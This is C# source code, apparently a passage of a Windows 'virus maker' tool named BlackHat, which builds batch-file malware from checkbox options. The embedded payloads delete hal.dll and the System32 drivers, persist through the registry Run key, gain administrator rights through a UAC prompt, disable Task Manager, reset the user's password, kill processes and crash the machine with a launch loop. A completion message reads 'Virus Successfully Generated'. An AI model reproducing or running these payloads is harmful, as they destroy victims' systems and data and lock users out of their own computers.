                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else
                        if (KillComputerCheck.Checked)//kill computer (careful using this)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }

            }
            else
            if (KillComputerCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else
                        if (PasswordCheck.Checked)//kill computer (careful using this)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");       
                        }
                        else
                        if (CrazyMouseCheck.Checked)//swaps mouse buttons
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (CrazyMouseCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else
                        if (PasswordCheck.Checked)//kill computer (careful using this)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else
                        if (KillComputerCheck.Checked)//swaps mouse buttons
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                    }
                }
            }
            MessageBox.Show("Virus Successfully Generated", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);//shows its been created
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            string version = client.DownloadString("https://raw.githubusercontent.com/MavenCoding157/BlackHat/main/Version.txt");
            if (version.Contains(CurrentVersion))
            {
                MessageBox.Show("BlackHat Is Up To Date", "Update", MessageBoxButtons.OK,MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Please update to a newer version.", "Update", MessageBoxButtons.OK,MessageBoxIcon.Information);
                System.Diagnostics.Process.Start("https://github.com/MavenCoding157/BlackHat");
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This tool was made by MavenCoding157 as a spinoff of BlackHost's Virus Maker.","About",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }

        private void KillComputerCheck_CheckedChanged(object sender, EventArgs e)
        {
            if (KillComputerCheck.Checked)
            {
                MessageBox.Show("BE CAREFULL USING THIS OPTION AS IT CAN DESTROY A USERS PC.","WARNING", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
